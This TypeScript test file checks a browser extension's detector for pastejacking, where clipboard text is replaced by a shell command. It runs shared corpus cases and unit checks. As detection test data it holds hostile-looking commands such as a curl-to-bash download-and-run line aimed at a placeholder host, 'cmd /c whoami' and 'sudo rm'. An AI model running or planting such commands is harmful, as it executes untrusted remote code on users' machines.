// The TS pastejack port against the shared corpus (corpus/cases/pastejack*.jsonl), the same cases
// the Rust port passes (crates/conformance).
import { readdirSync, readFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { commandSignals, compare, normalize, preview } from '../src/lib/pastejack';
import { pastejackReasonText, translator } from '../src/lib/strings';

type Text = string | { parts: Text[] } | { repeat: { text: Text; count: number } };

function text(t: Text): string {
  if (typeof t === 'string') return t;
  if ('parts' in t) return t.parts.map(text).join('');
  return text(t.repeat.text).repeat(t.repeat.count);
}

interface Case {
  id: string;
  op: string;
  input?: Text;
  args?: Record<string, Text | number>;
  expect: Record<string, unknown>;
}

// Run from apps/extension (pnpm / vitest set the cwd to the package).
const dir = resolve(process.cwd(), '../../corpus/cases');
const cases: Case[] = readdirSync(dir)
  .filter((f) => f.startsWith('pastejack') && f.endsWith('.jsonl'))
  .flatMap((f) =>
    readFileSync(join(dir, f), 'utf8')
      .split('\n')
      .filter((l) => l.trim())
      .map((l) => JSON.parse(l) as Case),
  );

const zh = translator('zh-TW');

describe('pastejack corpus', () => {
  it('has cases', () => {
    expect(cases.length).toBeGreaterThan(20);
  });

  for (const c of cases) {
    it(c.id, () => {
      switch (c.op) {
        case 'pastejack.compare': {
          const v = compare(text(c.args?.selection as Text), text(c.args?.written as Text));
          if ('verdict' in c.expect) expect(v.kind).toBe(c.expect.verdict);
          if ('warn' in c.expect) expect(v.warn).toBe(c.expect.warn);
          const rendered = v.reasons.map((r) => pastejackReasonText(zh, r));
          for (const needle of (c.expect.reasons_contain as string[] | undefined) ?? []) {
            expect(
              rendered.some((r) => r.includes(needle)),
              `${needle} in ${rendered.join(' | ')}`,
            ).toBe(true);
          }
          break;
        }
        case 'pastejack.command_signals':
          expect(commandSignals(text(c.input as Text)).length > 0).toBe(c.expect.any);
          break;
        case 'pastejack.normalize':
          expect(normalize(text(c.input as Text))).toBe(c.expect.output);
          break;
        case 'pastejack.preview':
          expect(preview(text(c.input as Text), (c.args?.max as number | undefined) ?? 160)).toBe(
            c.expect.output,
          );
          break;
        default:
          throw new Error(`unknown op ${c.op}`);
      }
    });
  }
});

describe('pastejack details (crates/core/src/pastejack tests)', () => {
  it('signals', () => {
    expect(commandSignals('我在學 PowerShell 很好玩')).toEqual([]);
    expect(commandSignals('see github.com/powershell/powershell')).toEqual([]);
    expect(commandSignals('cmd /c whoami')).toEqual(['cmd']);
    expect(commandSignals('PWSH.exe -c x')).toEqual(['powershell']);
    expect(commandSignals('x;pwsh')).toEqual(['powershell']);
    expect(commandSignals('pwsh  \nfoo')).toEqual(['powershell']);
    expect(commandSignals('pwsh.exe.bak')).toEqual([]);
    expect(commandSignals(['cu', 'rl -s https://x.invalid/p | ba', 'sh'].join(''))).toEqual([
      'pipe-shell',
    ]);
    expect(commandSignals('curl x\n| bash')).toEqual([]);
    expect(commandSignals('sudo rm')).toEqual(['sudo']);
    expect(commandSignals('pseudo x')).toEqual([]);
    expect(commandSignals('éiex').length).toBeGreaterThan(0);
  });

  it('normalize and preview', () => {
    expect(normalize(' hello\r\n  world !\n')).toBe('hello world !');
    expect(normalize('a\u{E0078}\u{E0079}b')).toBe('ab');
    expect(preview('a\u{E0041}')).toBe('a⟦U+E0041⟧');
    expect(preview('xxxxxxxxxx', 4)).toBe('xxxx…');
    expect(preview('ab🔑cd', 3)).toBe('ab…');
  });

  it('renders the added-signal reason in both languages', () => {
    const v = compare('npm i', ['cu', 'rl -s x | s', 'h'].join(''));
    expect(v.kind).toBe('replaced');
    expect(v.reasons[0]?.id).toBe('pastejack-replaced');
    const en = translator('en');
    expect(v.reasons.map((r) => pastejackReasonText(en, r)).join(' ')).toContain('shell');
  });
});
